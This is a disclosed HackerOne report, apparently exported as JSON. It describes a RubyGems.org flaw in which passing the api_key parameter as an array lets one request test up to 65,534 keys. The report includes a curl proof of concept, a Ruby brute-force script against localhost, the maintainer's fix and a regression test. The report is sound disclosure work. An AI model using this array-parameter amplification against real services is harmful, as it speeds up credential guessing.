{"id":449356,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NDkzNTY=","url":"https://hackerone.com/reports/449356","title":"65534 times efficient, Brute-force attack for api_key","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2018-11-24T14:40:39.546Z","submitted_at":"2018-11-24T14:40:39.546Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ooooooo_q","url":"/ooooooo_q","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8212,"url":"https://hackerone.com/rubygems","handle":"rubygems","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"RubyGems","twitter_handle":"rubygems_status","website":"https://rubygems.org","about":"RubyGems.org is the Ruby community’s gem hosting service."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-12-08T19:38:26.977Z","bug_reporter_agreed_on_going_public_at":"2018-12-06T22:41:42.392Z","team_member_agreed_on_going_public_at":"2018-12-08T19:38:26.925Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I have found that type checking for `api_key` is insufficient in rubygems.org's source code.\n\nhttps://github.com/rubygems/rubygems.org/blob/master/app/controllers/application_controller.rb#L63\n\n```ruby\ndef authenticate_with_api_key\n  api_key   = request.headers[\"Authorization\"] || params[:api_key]\n  @api_user = User.find_by_api_key(api_key)\nend\n```\nUsing an array in `params[:api_key]` makes searching for api_key more efficient.\n\n\n### poc\n\n1. start server in local\n2. Access url with multiple api_key\n\n```\n$ curl --globoff 'http://localhost:3000/api/v1/gems?api_key[]=key1\u0026api_key[]=key2'\n\u003e Access Denied. Please sign up for an account at https://rubygems.org\n```\n\n##### rails log\n\n```log\nStarted GET \"/api/v1/gems?api_key[]=key1\u0026api_key[]=key2\" for ::1 at 2018-11-24 23:03:30 +0900\nProcessing by Api::V1::RubygemsController#index as */*\n  Parameters: {\"api_key\"=\u003e[\"key1\", \"key2\"]}\n  User Load (0.5ms)  SELECT  \"users\".* FROM \"users\" WHERE \"users\".\"api_key\" IN ($1, $2) LIMIT $3  [[\"api_key\", \"key1\"], [\"api_key\", \"key2\"], [\"LIMIT\", 1]]\n  ↳ app/controllers/application_controller.rb:65\n  Rendering text template\n  Rendered text template (0.0ms)\nFilter chain halted as :verify_authenticated_user rendered or redirected\nCompleted 401 Unauthorized in 2ms (Views: 0.3ms | ActiveRecord: 0.5ms | Elasticsearch: 0.0ms)\n```\n\n## Impact\n\nAs a result of trying how much it can be sent using POST, 65534 api_key's could be sent.\nA postgres error will occur if you send more values.\n\nHere is the script used for confirmation.\n\n```ruby\nrequire 'net/http'\nrequire 'securerandom'\nrequire 'json'\n\nkeys = 65534.times.map{SecureRandom.hex(32)}\n# keys = 65535.times.map{SecureRandom.hex(32)} # error\n\nuri = URI.parse(\"http://localhost:3000/api/v1/web_hooks/fire.json?url=http://example.com/\")\nhttp = Net::HTTP.new(uri.host, uri.port)\nreq = Net::HTTP::Post.new(uri.path)\nreq[\"Content-Type\"] = \"application/json\"\nreq.body = {api_key: keys}.to_json\n\nres = http.request(req)\n```\n\nAttacks against api_key are 65534 times more efficient, but since the string generated by `SecureRandom.hex (32)` has sufficient length, the impact seems to be minimal.","original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-01-05T22:41:42.442Z","allow_singular_disclosure_after":-87236380.20613474,"singular_disclosure_allowed":true,"vote_count":7,"voters":["sameerphad72","dhakal_ananda","ali","dineshpopz","reppie","sonalkr132","s3rgio1993"],"severity":{"rating":"low","author_type":"User"},"structured_scope":{"databaseId":2042,"asset_type":"URL","asset_identifier":"rubygems.org","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":3703444,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for submitting this report to RubyGems. Our team will review and investigate the issue. Please note that only issues in the rubygems library are eligible for our bug bounty program.","automated_response":true,"created_at":"2018-11-24T14:40:39.957Z","updated_at":"2018-11-24T14:40:39.957Z","actor":{"url":"/rubygems","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"RubyGems"}},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3703999,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @ooooooo_q,\n\nThanks for your report. Can you please confirm if following change fixes the issue?\n\n```diff\n   def authenticate_with_api_key\n-    api_key   = request.headers[\"Authorization\"] || params[:api_key]\n+    api_key   = request.headers[\"Authorization\"] || params.permit(:api_key).fetch(:api_key, \"\")\n     @api_user = User.find_by_api_key(api_key)\n   end\n \ndiff --git a/test/integration/api/v1/rubygems_test.rb b/test/integration/api/v1/rubygems_test.rb\nnew file mode 100644\nindex 00000000..5e4b7511\n--- /dev/null\n+++ b/test/integration/api/v1/rubygems_test.rb\n@@ -0,0 +1,12 @@\n+require 'test_helper'\n+\n+class Api::V1::RubygemsTest \u003c ActionDispatch::IntegrationTest\n+  setup do\n+    @user = create(:user)\n+  end\n+\n+  test \"array of api keys use first value\" do\n+    get \"/api/v1/gems?api_key[]=key1\u0026api_key[]=#{@user.api_key}\", as: :json\n+    assert_response :unauthorized\n+  end\n+end\n\n```\n\n","automated_response":false,"created_at":"2018-11-24T19:21:00.282Z","updated_at":"2018-11-24T19:33:43.543Z","actor":{"username":"sonalkr132","cleared":false,"url":"/sonalkr132","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/110/393/d14955d9a0ac015bfba8df495ebf3c8b9f6f87cd_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3704000,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2018-11-24T19:21:11.418Z","updated_at":"2018-11-24T19:21:11.418Z","actor":{"username":"sonalkr132","cleared":false,"url":"/sonalkr132","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/110/393/d14955d9a0ac015bfba8df495ebf3c8b9f6f87cd_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3704054,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @sonalkr132\nI confirmed it and it works well.","automated_response":false,"created_at":"2018-11-24T19:47:27.085Z","updated_at":"2018-11-24T19:47:27.085Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3752598,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Above fix was deployed to production. \n@ooooooo_q Thank you so much for this report. Please let us know if issue still exists.","automated_response":false,"created_at":"2018-12-03T17:06:28.771Z","updated_at":"2018-12-03T17:06:28.771Z","actor":{"username":"sonalkr132","cleared":false,"url":"/sonalkr132","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/110/393/d14955d9a0ac015bfba8df495ebf3c8b9f6f87cd_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"ooooooo_q","url":"/ooooooo_q"},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3780279,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"I confirmed that the master branch has been fixed.","automated_response":false,"created_at":"2018-12-06T22:41:42.408Z","updated_at":"2018-12-06T22:41:42.408Z","first_to_agree":true,"actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3791158,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"Only issues within the rubygems client library are eligible for a bounty.","automated_response":false,"created_at":"2018-12-08T19:35:58.190Z","updated_at":"2018-12-08T19:35:58.190Z","actor":{"url":"/rubygems","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"RubyGems"}},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3791173,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2018-12-08T19:38:26.942Z","updated_at":"2018-12-08T19:38:26.942Z","actor":{"username":"segiddins","cleared":false,"url":"/segiddins","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3791174,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2018-12-08T19:38:26.993Z","updated_at":"2018-12-08T19:38:26.993Z","actor":{"username":"segiddins","cleared":false,"url":"/segiddins","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}